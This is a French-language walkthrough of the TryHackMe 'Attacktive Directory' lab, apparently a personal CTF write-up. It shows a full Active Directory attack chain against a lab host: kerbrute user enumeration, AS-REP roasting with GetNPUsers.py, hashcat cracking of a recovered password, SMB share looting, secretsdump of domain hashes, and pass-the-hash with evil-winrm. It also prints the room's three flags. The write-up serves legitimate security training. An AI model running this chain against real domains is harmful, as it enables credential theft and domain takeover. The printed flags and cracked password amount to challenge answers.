# AttacktiveDirect

## Etape 1. SETUP

Télécharger les différents tools : 

Impacket :

    git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
    pip3 install -r /opt/impacket/requirements.txt
    cd /opt/impacket/ && python3 ./setup.py install

Bloodhound and neo4j:

    apt install bloodhound neo4j

## Etape 2. WELCOME TO ATTACKTIVE DIRECTORY

Nmap scan 

![](image/nmap.jpg)

    nmap -sV -sC -o ad.nmap 10.10.159.18

![](image/enum4linux.jpg)

    enum4linux -M [target_ip]

![](image/NetBIOS%20rep.jpg)

![](image/NetBIOS-Domain.jpg)

![](image/TLDRep.jpg)

![](image/TLD.jpg)

# Etape 3.ENUMERATION ENUMERATING USERS VIA KERBEROS:

Téléchargement de Kerbrute :

    https://github.com/ropnop/kerbrute/releases

Téléchargement du la Liste de Mdp et la liste d'Username

    # Username List
    wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

    # Password List
    wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt


On lance kerbrute pour énumérer la machine

![](image/KerbruteTerm.jpg)

    ./kerbrute userenum --dc=10.10.159.18 -d=spookysec.local. ../../THM/AD/userList.txt

![](image/KerbruteAns.jpg)

## Etape4.EXPLOITATION ABUSING KERBEROS

On a trouvé deux users non commun "svc-admin" et "backup"
On va utiliser l'outil "GetNPUsers.py"

    GetNPUsers.py -no-pass -dc-ip [Target_IP] spookysec.local/svc-admin
![](image/GetNPUusersLaunch.jpg)

![](image/GetNPUusersHash.jpg)

>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)

Rapide recherche sur google et on sait que l'on doit utiliser le mode 18200 pour craquer le hash

![](image/hashcatHash.jpg)

On va donc utiliser hashcat pour craquer le mot de passe de "svc-admin"

![](image/crackhash.jpg)

    mot de passe : management2005


![](image/repEtape4.jpg)

## Etape 5. BACK TO THE BASICS

On peut maintenant essayer d'énumérer les dossiers partagés SMB en utilisant nos nouveaux identifiants

![](image/smbclient1.jpg)

On parcour les dossiers et on fini par trouver un dossier dans lequel on peut se connecter.

On y trouve même un fichier intéressant 

![](image/smbclient2.jpg)

On le télécharge 

![](image/smbclient3.jpg)

C'est un fichier encodé en base64, on a juste à le décoder

![](image/smbclient4.jpg)

![](image/smbRep.jpg)

# Etape 6. ELEVATING PRIVILEGES WITHIN THE DOMAIN

L'obtention des informations d'identification de la sauvegarde nous permet d'avoir plus de privilèges en tant que compte de sauvegarde dans un Domain Controller (DC). Ceci est dû au fait que toute modification de l'Active Directory (AD) reflétera ces modifications dans ce compte de sauvegarde. Par conséquent, nous pouvons obtenir les hashs des mots de passe de chaque utilisateur. Pour ce faire, nous pouvons utiliser secretsdump.py d'Impacket

![](image/secretDumpHash.jpg)

On va maintenant installer evil-winrm afin d'accéder au système via le port 5985

    sudo gem install evil-winrm

![](image/Rep.jpg)

## Etape 7. FLAG SUBMISSION PANEL 

On va lancer evil-winrm afin d'obtenir un PowerShell en Administrateur 

    evil-winrm -i [Target_IP] -u Administrator -H [Administrator_Hash]
![](image/Evil-winrm%20Launch.jpg)

On recherche 3 flag 

1. svc-admin
2. backup
3. Administrator

![](image/rootflag.jpg)


![](image/userflag.jpg)


![](image/backupflag.jpg)


    Administrator : TryHackMe{4ctiveD1rectoryM4st3r}

    User : TryHackMe{K3rb3r0s_Pr3_4uth} 
    
    Backup : TryHackMe{B4ckM3UpSc0tty!}



